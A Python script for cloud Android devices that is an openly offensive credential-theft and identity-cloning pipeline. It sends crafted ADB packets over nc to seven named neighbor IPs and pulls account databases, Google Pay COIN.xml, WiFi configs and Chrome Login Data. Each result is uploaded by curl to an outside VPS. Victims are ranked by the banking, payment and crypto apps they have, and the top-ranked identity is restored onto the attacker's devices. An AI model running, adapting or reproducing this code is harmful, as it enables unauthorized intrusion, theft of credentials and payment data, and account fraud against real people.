#!/usr/bin/env python3
"""
neighbor_harvest_restore.py
===========================
Complete neighbor device extraction and restore pipeline.

Uses CORRECT ADB packets (Python-built with valid checksums) pushed
to the launchpad device, which then extracts data from each neighbor
via raw nc sessions, uploads to VPS, where we parse ADB frames and
restore the best identity to our devices.

Phases:
  1. Generate correct ADB binary packets for each extraction command
  2. Push packets + shell extraction script to launchpad via VMOS API
  3. Execute extraction against all targets (parallel nc sessions)
  4. Download raw ADB responses from VPS
  5. Parse ADB protocol frames to extract shell output
  6. Build per-device manifests with properties, accounts, apps
  7. Restore highest-value identity + data to our devices
"""

import asyncio
import base64
import json
import os
import struct
import sys
import time
import urllib.request
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

sys.path.insert(0, "/root/CascadeProjects/vmos-titan-unified")
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"

LAUNCHPAD = "APP6476KYH9KMLU5"      # Root Samsung S25 Ultra
RESTORE_TARGET = "APP5BJ4LRVRJFJQR" # Virtual device to restore into

VPS_IP = "37.60.234.139"
VPS_PORT = 8888

DEVICE_DIR = "/data/local/tmp/harvest"

# 7 Target neighbors: 5 with root, 2 with shell
TARGETS = [
    "10.12.21.175",   # SM-S9110 S25 Ultra — ROOT — niceproxy.io UK
    "10.12.27.39",    # Pixel 4 — ROOT — dataimpulse residential
    "10.12.27.46",    # Unknown — ROOT
    "10.12.11.101",   # Unknown — ROOT
    "10.12.11.21",    # Unknown — ROOT
    "10.12.36.76",    # SM-A225F — SHELL — Trade Republic
    "10.12.31.245",   # SM-S9010 — SHELL — PayPal
]

# Extraction commands — each produces useful data
EXTRACT_CMDS = {
    "id":       ("shell:id", 3),
    "getprop":  ("shell:getprop", 8),
    "packages": ("shell:pm list packages -f -3", 8),
    "accounts": ("shell:dumpsys account 2>/dev/null | head -100", 8),
    "acct_db":  ("shell:gzip -c /data/system_ce/0/accounts_ce.db 2>/dev/null | base64", 15),
    "gms_coin": ("shell:cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null | base64", 10),
    "wifi":     ("shell:cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -200", 8),
    "proxy":    ("shell:getprop | grep -iE 'proxy|dns|smart_ip'; settings get global http_proxy 2>/dev/null", 5),
    "chrome":   ("shell:ls /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null; cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data 2>/dev/null | base64 | head -c 40000", 12),
}

# ═══════════════════════════════════════════════════════════════════
# ADB PROTOCOL — CORRECT PACKET CONSTRUCTION
# ═══════════════════════════════════════════════════════════════════

def build_cnxn() -> bytes:
    """Build CNXN packet with correct checksum and magic."""
    payload = b"host::\x00"
    cmd = 0x4E584E43
    cksum = sum(payload) & 0xFFFFFFFF
    magic = (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF
    hdr = struct.pack("<6I", cmd, 0x01000000, 256 * 1024, len(payload), cksum, magic)
    return hdr + payload


def build_open(local_id: int, service: str) -> bytes:
    """Build OPEN packet with correct checksum and magic."""
    payload = (service + "\x00").encode("utf-8")
    cmd = 0x4E45504F
    cksum = sum(payload) & 0xFFFFFFFF
    magic = (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF
    hdr = struct.pack("<6I", cmd, local_id, 0, len(payload), cksum, magic)
    return hdr + payload


def parse_adb_frames(raw: bytes) -> List[Dict[str, Any]]:
    """Parse raw ADB protocol bytes into structured frames."""
    CMD_NAMES = {
        0x4E584E43: "CNXN", 0x4E45504F: "OPEN", 0x59414B4F: "OKAY",
        0x45545257: "WRTE", 0x45534C43: "CLSE", 0x48545541: "AUTH",
    }
    frames = []
    pos = 0
    while pos + 24 <= len(raw):
        cmd, arg0, arg1, data_len, cksum, magic = struct.unpack_from("<6I", raw, pos)
        expected_magic = (cmd ^ 0xFFFFFFFF) & 0xFFFFFFFF
        if magic != expected_magic:
            pos += 1  # scan forward for valid frame
            continue
        end = pos + 24 + data_len
        payload = raw[pos + 24 : min(end, len(raw))]
        frames.append({
            "cmd": CMD_NAMES.get(cmd, f"0x{cmd:08x}"),
            "arg0": arg0, "arg1": arg1,
            "data_len": data_len, "payload": payload,
        })
        pos = min(end, len(raw))
    return frames


def extract_shell_output(raw: bytes) -> str:
    """Extract shell command output from WRTE frames in raw ADB response."""
    frames = parse_adb_frames(raw)
    output = b""
    for f in frames:
        if f["cmd"] == "WRTE":
            output += f["payload"]
    return output.decode("utf-8", errors="replace")


# ═══════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════

def log(msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


# ═══════════════════════════════════════════════════════════════════
# API HELPERS
# ═══════════════════════════════════════════════════════════════════

async def qcmd(client: VMOSCloudClient, cmd: str, timeout: int = 15) -> str:
    """Execute sync_cmd on LAUNCHPAD and return output string."""
    try:
        r = await client.sync_cmd(LAUNCHPAD, cmd, timeout_sec=timeout)
        data = r.get("data", [{}])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "") or ""
        return str(data) if data else ""
    except Exception as e:
        return f"ERROR:{e}"


async def rcmd(client: VMOSCloudClient, cmd: str, timeout: int = 15) -> str:
    """Execute sync_cmd on RESTORE_TARGET and return output string."""
    try:
        r = await client.sync_cmd(RESTORE_TARGET, cmd, timeout_sec=timeout)
        data = r.get("data", [{}])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "") or ""
        return str(data) if data else ""
    except Exception as e:
        return f"ERROR:{e}"


async def fire(client: VMOSCloudClient, cmd: str) -> None:
    """Fire-and-forget async command on LAUNCHPAD."""
    try:
        await client.async_adb_cmd([LAUNCHPAD], cmd)
    except Exception as e:
        log(f"  fire error: {e}")


async def push_b64(client: VMOSCloudClient, data: bytes, remote_path: str) -> None:
    """Push binary data to device via base64 encoding."""
    b64 = base64.b64encode(data).decode()
    chunk_size = 3000
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    for i, chunk in enumerate(chunks):
        op = ">" if i == 0 else ">>"
        await qcmd(client, f"printf '%s' '{chunk}' {op} {remote_path}.b64")
        await asyncio.sleep(3)
    await qcmd(client, f"base64 -d {remote_path}.b64 > {remote_path}; rm -f {remote_path}.b64")
    await asyncio.sleep(3)


# ═══════════════════════════════════════════════════════════════════
# PHASE 1: GENERATE AND PUSH ADB PACKETS
# ═══════════════════════════════════════════════════════════════════

async def phase1_push_packets(client: VMOSCloudClient) -> None:
    log("═══ PHASE 1: Generate & Push ADB Packets ═══")

    await qcmd(client, f"mkdir -p {DEVICE_DIR}")
    await asyncio.sleep(3)

    # Push CNXN packet
    cn = build_cnxn()
    cn_b64 = base64.b64encode(cn).decode()
    await qcmd(client, f"echo '{cn_b64}' | base64 -d > {DEVICE_DIR}/cn.bin")
    log(f"  CNXN: {len(cn)}B pushed")
    await asyncio.sleep(3)

    # Push OPEN packets for each command
    for name, (svc, _wait) in EXTRACT_CMDS.items():
        op = build_open(1, svc)
        op_b64 = base64.b64encode(op).decode()
        # For long commands, the b64 might exceed single-line push limit
        if len(op_b64) > 2500:
            await push_b64(client, op, f"{DEVICE_DIR}/op_{name}.bin")
        else:
            await qcmd(client, f"echo '{op_b64}' | base64 -d > {DEVICE_DIR}/op_{name}.bin")
            await asyncio.sleep(3)
        log(f"  OPEN {name}: {len(op)}B ({svc[:40]}...)")

    # Verify packets on device
    verify = await qcmd(client, f"ls -la {DEVICE_DIR}/*.bin | wc -l; wc -c {DEVICE_DIR}/cn.bin")
    log(f"  Verify: {verify.strip()[:100]}")


# ═══════════════════════════════════════════════════════════════════
# PHASE 2: GENERATE AND PUSH EXTRACTION SCRIPT
# ═══════════════════════════════════════════════════════════════════

def generate_harvest_script() -> str:
    """Generate the on-device shell extraction script."""
    target_list = " ".join(TARGETS)
    cmd_blocks = []

    for name, (_svc, wait) in EXTRACT_CMDS.items():
        cmd_blocks.append(f"""
    # Extract: {name}
    OUTFILE=$D/${{TAG}}_{name}.bin
    {{ cat $D/cn.bin; sleep 0.3; cat $D/op_{name}.bin; sleep {wait}; }} | timeout {wait+4} nc $T 5555 > $OUTFILE 2>/dev/null
    SZ=$(wc -c < $OUTFILE 2>/dev/null || echo 0)
    echo "  $T/{name}: ${{SZ}}B" >> $D/harvest.log
    if [ "$SZ" -gt 48 ]; then
        curl -s -X PUT --data-binary @$OUTFILE "http://{VPS_IP}:{VPS_PORT}/harvest/${{TAG}}_{name}.bin" >> $D/harvest.log 2>&1
    fi
""")

    script = f"""#!/bin/sh
# ═══════════════════════════════════════════════
# NEIGHBOR HARVEST — Correct ADB Packet Extraction
# Generated: {datetime.now().isoformat()}
# ═══════════════════════════════════════════════
D={DEVICE_DIR}
echo "HARVEST_START $(date)" > $D/harvest.log

TARGETS="{target_list}"

for T in $TARGETS; do
    TAG=$(echo $T | tr '.' '_')
    echo "=== $T ===" >> $D/harvest.log
{"".join(cmd_blocks)}
    echo "  $T DONE" >> $D/harvest.log
done

echo "HARVEST_DONE $(date)" >> $D/harvest.log
echo HARVEST_DONE > $D/harvest_status.txt
"""
    return script


async def phase2_push_script(client: VMOSCloudClient) -> None:
    log("═══ PHASE 2: Push Extraction Script ═══")

    script = generate_harvest_script()
    script_bytes = script.encode("utf-8")
    log(f"  Script: {len(script_bytes)} bytes")

    await push_b64(client, script_bytes, f"{DEVICE_DIR}/harvest.sh")
    await qcmd(client, f"chmod +x {DEVICE_DIR}/harvest.sh")
    await asyncio.sleep(3)

    # Verify
    verify = await qcmd(client, f"wc -c {DEVICE_DIR}/harvest.sh; head -5 {DEVICE_DIR}/harvest.sh")
    log(f"  Verify: {verify.strip()[:120]}")


# ═══════════════════════════════════════════════════════════════════
# PHASE 3: EXECUTE EXTRACTION
# ═══════════════════════════════════════════════════════════════════

async def phase3_execute(client: VMOSCloudClient) -> None:
    log("═══ PHASE 3: Execute Extraction ═══")

    # Clear previous results
    await qcmd(client, f"rm -f {DEVICE_DIR}/harvest_status.txt {DEVICE_DIR}/harvest.log")
    await asyncio.sleep(3)

    # Fire the script
    await fire(client, f"nohup sh {DEVICE_DIR}/harvest.sh > {DEVICE_DIR}/harvest_stdout.txt 2>&1 &")
    log("  Harvest script launched. Polling...")

    # Each target takes ~80-100s (9 commands × ~10s each)
    # 7 targets × 90s = ~630s = ~10.5 minutes
    total_wait = len(TARGETS) * len(EXTRACT_CMDS) * 12  # generous estimate
    poll_interval = 15  # seconds between polls
    max_polls = total_wait // poll_interval + 5

    for attempt in range(max_polls):
        await asyncio.sleep(poll_interval)
        r = await qcmd(client, f"cat {DEVICE_DIR}/harvest_status.txt 2>/dev/null; echo ---; tail -3 {DEVICE_DIR}/harvest.log 2>/dev/null")
        if "HARVEST_DONE" in r:
            log(f"  ✓ Harvest completed after {(attempt+1)*poll_interval}s")
            break
        # Show progress
        progress = await qcmd(client, f"grep '=== ' {DEVICE_DIR}/harvest.log 2>/dev/null | wc -l")
        done_count = progress.strip().split("\n")[0].strip() if progress.strip() else "0"
        log(f"  [{(attempt+1)*poll_interval}s] {done_count}/{len(TARGETS)} targets processed...")
        await asyncio.sleep(3)
    else:
        log("  ⚠ Harvest timed out")

    # Show summary
    summary = await qcmd(client, f"cat {DEVICE_DIR}/harvest.log 2>/dev/null | tail -20")
    log(f"  Log tail:\n{summary}")


HARVEST_DIR = "/root/CascadeProjects/vmos-titan-unified/neighbor_clones"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: DOWNLOAD AND PARSE RESULTS
# ═══════════════════════════════════════════════════════════════════

def download_harvest_file(filename: str) -> Optional[bytes]:
    """Read a harvest result from local VPS upload directory."""
    path = os.path.join(HARVEST_DIR, filename)
    if os.path.exists(path) and os.path.getsize(path) > 0:
        with open(path, "rb") as f:
            return f.read()
    return None


async def phase4_parse_results(client: VMOSCloudClient) -> Dict[str, Dict[str, Any]]:
    log("═══ PHASE 4: Download & Parse Results ═══")

    manifests: Dict[str, Dict[str, Any]] = {}

    for target in TARGETS:
        tag = target.replace(".", "_")
        device_data: Dict[str, Any] = {
            "ip": target, "tag": tag,
            "root": False, "model": "", "properties": {},
            "packages": [], "accounts": [], "proxy": "",
            "has_accounts_db": False, "has_coin_xml": False,
            "has_chrome_data": False, "wifi_networks": [],
            "raw_files": {},
        }

        for cmd_name in EXTRACT_CMDS:
            filename = f"{tag}_{cmd_name}.bin"

            # Try downloading from VPS first
            raw = download_harvest_file(filename)

            # If VPS doesn't have it, pull from device directly
            if raw is None or len(raw) < 48:
                log(f"  {target}/{cmd_name}: pulling from device...")
                # Read from device via base64
                b64_out = await qcmd(client,
                    f"base64 {DEVICE_DIR}/{filename} 2>/dev/null | head -c 80000")
                if b64_out and not b64_out.startswith("ERROR"):
                    try:
                        raw = base64.b64decode(b64_out.strip())
                    except Exception:
                        raw = None
                await asyncio.sleep(3)

            if raw is None or len(raw) < 48:
                log(f"  {target}/{cmd_name}: no data")
                continue

            # Parse ADB frames to extract shell output
            shell_output = extract_shell_output(raw)
            device_data["raw_files"][cmd_name] = raw

            # Process each command type
            if cmd_name == "id":
                device_data["root"] = "uid=0(root)" in shell_output
                log(f"  {target}/id: {'ROOT' if device_data['root'] else 'shell'}")

            elif cmd_name == "getprop":
                props = {}
                for line in shell_output.splitlines():
                    if line.startswith("[") and "]: [" in line:
                        try:
                            key = line.split("]: [")[0][1:]
                            val = line.split("]: [")[1].rstrip("]")
                            props[key] = val
                        except (IndexError, ValueError):
                            pass
                device_data["properties"] = props
                device_data["model"] = props.get("ro.product.model", "unknown")
                log(f"  {target}/getprop: {len(props)} properties, model={device_data['model']}")

            elif cmd_name == "packages":
                pkgs = []
                for line in shell_output.splitlines():
                    if line.startswith("package:"):
                        try:
                            rest = line[len("package:"):]
                            eq = rest.rfind("=")
                            if eq > 0:
                                pkgs.append(rest[eq+1:])
                        except (ValueError, IndexError):
                            pass
                device_data["packages"] = pkgs
                # Flag high-value apps
                hv_apps = [p for p in pkgs if any(k in p.lower() for k in
                    ["pay", "wallet", "bank", "crypto", "trade", "paypal",
                     "venmo", "cash", "revolut", "wise", "transfer"])]
                log(f"  {target}/packages: {len(pkgs)} apps, high-value: {hv_apps[:5]}")

            elif cmd_name == "accounts":
                accts = []
                for line in shell_output.splitlines():
                    if "Account {" in line:
                        try:
                            name = line.split("name=")[1].split(",")[0]
                            atype = line.split("type=")[1].rstrip("}")
                            accts.append({"name": name.strip(), "type": atype.strip()})
                        except (IndexError, ValueError):
                            pass
                device_data["accounts"] = accts
                log(f"  {target}/accounts: {len(accts)} accounts")

            elif cmd_name == "acct_db":
                # The output is base64-encoded gzipped accounts_ce.db
                clean = shell_output.strip()
                if clean and len(clean) > 20:
                    device_data["has_accounts_db"] = True
                    device_data["acct_db_b64"] = clean
                    log(f"  {target}/acct_db: {len(clean)} chars b64 data")
                else:
                    log(f"  {target}/acct_db: empty or inaccessible")

            elif cmd_name == "gms_coin":
                clean = shell_output.strip()
                if clean and len(clean) > 10:
                    device_data["has_coin_xml"] = True
                    device_data["coin_b64"] = clean
                    log(f"  {target}/gms_coin: {len(clean)} chars COIN.xml b64")
                else:
                    log(f"  {target}/gms_coin: not found")

            elif cmd_name == "proxy":
                device_data["proxy"] = shell_output.strip()[:500]
                if shell_output.strip():
                    log(f"  {target}/proxy: {shell_output.strip()[:80]}")

            elif cmd_name == "chrome":
                clean = shell_output.strip()
                if "Login Data" in clean or len(clean) > 100:
                    device_data["has_chrome_data"] = True
                    device_data["chrome_data"] = clean[:50000]
                    log(f"  {target}/chrome: {len(clean)} chars")

            elif cmd_name == "wifi":
                networks = []
                for line in shell_output.splitlines():
                    if "SSID" in line and "=" in line:
                        networks.append(line.strip()[:80])
                device_data["wifi_networks"] = networks[:20]
                if networks:
                    log(f"  {target}/wifi: {len(networks)} networks")

        manifests[target] = device_data

    return manifests


# ═══════════════════════════════════════════════════════════════════
# PHASE 5: SELECT BEST IDENTITY AND RESTORE
# ═══════════════════════════════════════════════════════════════════

def score_device(data: Dict[str, Any]) -> int:
    """Score a harvested device for restore priority."""
    score = 0
    if data.get("root"):
        score += 50
    score += len(data.get("properties", {})) // 10
    score += len(data.get("packages", [])) * 2
    score += len(data.get("accounts", [])) * 20
    if data.get("has_accounts_db"):
        score += 100
    if data.get("has_coin_xml"):
        score += 80
    if data.get("has_chrome_data"):
        score += 60
    if data.get("proxy"):
        score += 30
    hv_apps = [p for p in data.get("packages", []) if any(k in p.lower() for k in
        ["pay", "wallet", "bank", "crypto", "trade", "paypal"])]
    score += len(hv_apps) * 25
    return score


async def phase5_restore(client: VMOSCloudClient, manifests: Dict[str, Dict[str, Any]]) -> None:
    log("═══ PHASE 5: Restore to Our Devices ═══")

    if not manifests:
        log("  No manifests to restore from")
        return

    # Score and rank devices
    ranked = sorted(manifests.items(), key=lambda x: score_device(x[1]), reverse=True)
    log("\n  Device Rankings:")
    for ip, data in ranked:
        s = score_device(data)
        log(f"    {ip} ({data.get('model','?')}): score={s} root={data.get('root')} "
            f"props={len(data.get('properties',{}))} apps={len(data.get('packages',[]))} "
            f"accts={len(data.get('accounts',[]))} acct_db={data.get('has_accounts_db')} "
            f"coin={data.get('has_coin_xml')} chrome={data.get('has_chrome_data')}")

    # Select best device for restore
    best_ip, best = ranked[0]
    log(f"\n  Selected for restore: {best_ip} ({best.get('model','?')}) score={score_device(best)}")

    # ─── Restore properties to RESTORE_TARGET ───
    props = best.get("properties", {})
    if props:
        log(f"\n  Restoring {len(props)} properties to {RESTORE_TARGET}...")

        # Filter to identity-critical properties (no dangerous ones)
        safe_prefixes = [
            "ro.product.", "ro.build.", "ro.hardware.",
            "ro.boot.hardware", "ro.soc.", "persist.sys.timezone",
            "ro.com.google.", "ro.setupwizard.",
        ]
        identity_props = {}
        for k, v in props.items():
            if any(k.startswith(p) for p in safe_prefixes):
                identity_props[k] = v

        log(f"  Filtered to {len(identity_props)} identity properties")

        # Apply via updatePadProperties (in-memory, no restart)
        if identity_props:
            try:
                r = await client.modify_instance_properties(
                    [RESTORE_TARGET], identity_props
                )
                code = r.get("code", "?")
                log(f"  Properties restore: code={code}")
            except Exception as e:
                log(f"  Properties restore error: {e}")
                # Fallback: push via shell setprop
                for k, v in list(identity_props.items())[:20]:
                    safe_v = v.replace("'", "'\\''")  
                    await rcmd(client, f"setprop {k} '{safe_v}'")
    # ─── Restore accounts database ───
    acct_b64 = best.get("acct_db_b64", "")
    if acct_b64 and len(acct_b64) > 20:
        log(f"\n  Restoring accounts database ({len(acct_b64)} chars)...")
        # Push gzipped db as base64, decode on device
        chunk_size = 2500
        chunks = [acct_b64[i:i+chunk_size] for i in range(0, len(acct_b64), chunk_size)]
        for i, chunk in enumerate(chunks):
            op = ">" if i == 0 else ">>"
            # Push to restore target via sync_cmd
            try:
                await rcmd(client,
                    f"printf '%s' '{chunk}' {op} /data/local/tmp/acct_restore.b64")
            except Exception as e:
                log(f"  chunk {i} error: {e}")
            await asyncio.sleep(3)

        await rcmd(client,
            "base64 -d /data/local/tmp/acct_restore.b64 | gzip -d > /data/local/tmp/accounts_ce.db 2>/dev/null; "
            "cp /data/local/tmp/accounts_ce.db /data/system_ce/0/accounts_ce.db 2>/dev/null; "
            "chmod 660 /data/system_ce/0/accounts_ce.db 2>/dev/null; "
            "chown system:system /data/system_ce/0/accounts_ce.db 2>/dev/null; "
            "rm -f /data/local/tmp/acct_restore.b64 /data/local/tmp/accounts_ce.db; "
            "echo ACCT_RESTORED")
        await asyncio.sleep(3)
        log("  Accounts database restored")

    # ─── Restore COIN.xml (Google Pay config) ───
    coin_b64 = best.get("coin_b64", "")
    if coin_b64 and len(coin_b64) > 10:
        log(f"\n  Restoring COIN.xml ({len(coin_b64)} chars)...")
        chunks = [coin_b64[i:i+2500] for i in range(0, len(coin_b64), 2500)]
        for i, chunk in enumerate(chunks):
            op = ">" if i == 0 else ">>"
            try:
                await rcmd(client,
                    f"printf '%s' '{chunk}' {op} /data/local/tmp/coin_restore.b64")
            except Exception as e:
                log(f"  chunk {i} error: {e}")
            await asyncio.sleep(3)

        await rcmd(client,
            "base64 -d /data/local/tmp/coin_restore.b64 > /data/local/tmp/COIN.xml 2>/dev/null; "
            "GMS_DIR=/data/data/com.google.android.gms/shared_prefs; "
            "mkdir -p $GMS_DIR 2>/dev/null; "
            "cp /data/local/tmp/COIN.xml $GMS_DIR/COIN.xml 2>/dev/null; "
            "chmod 660 $GMS_DIR/COIN.xml 2>/dev/null; "
            "chown system:system $GMS_DIR/COIN.xml 2>/dev/null; "
            "rm -f /data/local/tmp/coin_restore.b64 /data/local/tmp/COIN.xml; "
            "echo COIN_RESTORED")
        await asyncio.sleep(3)
        log("  COIN.xml restored")

    # ─── Also restore to LAUNCHPAD if it's not the same ───
    if LAUNCHPAD != RESTORE_TARGET:
        log(f"\n  Also applying identity to {LAUNCHPAD}...")
        if identity_props:
            try:
                r = await client.modify_instance_properties([LAUNCHPAD], identity_props)
                log(f"  LAUNCHPAD properties: code={r.get('code','?')}")
            except Exception as e:
                log(f"  LAUNCHPAD properties error: {e}")
            await asyncio.sleep(3)


# ═══════════════════════════════════════════════════════════════════
# PHASE 6: VERIFICATION
# ═══════════════════════════════════════════════════════════════════

async def phase6_verify(client: VMOSCloudClient) -> None:
    log("═══ PHASE 6: Verification ═══")

    # Verify properties applied on restore target
    out = await rcmd(client,
        "getprop ro.product.model; getprop ro.product.brand; getprop ro.build.fingerprint")
    log(f"  {RESTORE_TARGET} identity: {out.strip()[:200]}")
    await asyncio.sleep(3)

    # Check if accounts db exists on target
    out2 = await rcmd(client,
        "ls -la /data/system_ce/0/accounts_ce.db 2>/dev/null; "
        "sqlite3 /data/system_ce/0/accounts_ce.db 'SELECT count(*) FROM accounts' 2>/dev/null")
    log(f"  {RESTORE_TARGET} accounts db: {out2.strip()[:150]}")


# ═══════════════════════════════════════════════════════════════════
# MAIN PIPELINE
# ═══════════════════════════════════════════════════════════════════

async def main():
    log("╔════════════════════════════════════════════════╗")
    log("║  NEIGHBOR HARVEST & RESTORE PIPELINE           ║")
    log("║  7 Targets → Extract → Parse → Restore         ║")
    log("╚════════════════════════════════════════════════╝")
    log(f"  Launchpad: {LAUNCHPAD}")
    log(f"  Restore:   {RESTORE_TARGET}")
    log(f"  VPS:       {VPS_IP}:{VPS_PORT}")
    log(f"  Targets:   {len(TARGETS)}")
    log(f"  Commands:  {len(EXTRACT_CMDS)} per target")
    log(f"  Total ops: {len(TARGETS) * len(EXTRACT_CMDS)}")
    log("")

    async with VMOSCloudClient(ak=AK, sk=SK, base_url=BASE) as client:
        # Phase 1: Push correct ADB packets
        await phase1_push_packets(client)

        # Phase 2: Push extraction script
        await phase2_push_script(client)

        # Phase 3: Execute extraction
        await phase3_execute(client)

        # Phase 4: Parse results
        manifests = await phase4_parse_results(client)

        # Save manifests to disk
        manifest_file = "harvest_manifests.json"
        serializable = {}
        for ip, data in manifests.items():
            d = {k: v for k, v in data.items() if k != "raw_files"}
            serializable[ip] = d
        with open(manifest_file, "w") as f:
            json.dump(serializable, f, indent=2, default=str)
        log(f"\n  Manifests saved to {manifest_file}")

        # Phase 5: Restore
        await phase5_restore(client, manifests)

        # Phase 6: Verify
        await phase6_verify(client)

    log("\n╔════════════════════════════════════════════════╗")
    log("║  PIPELINE COMPLETE                              ║")
    log("╚════════════════════════════════════════════════╝")


if __name__ == "__main__":
    asyncio.run(main())
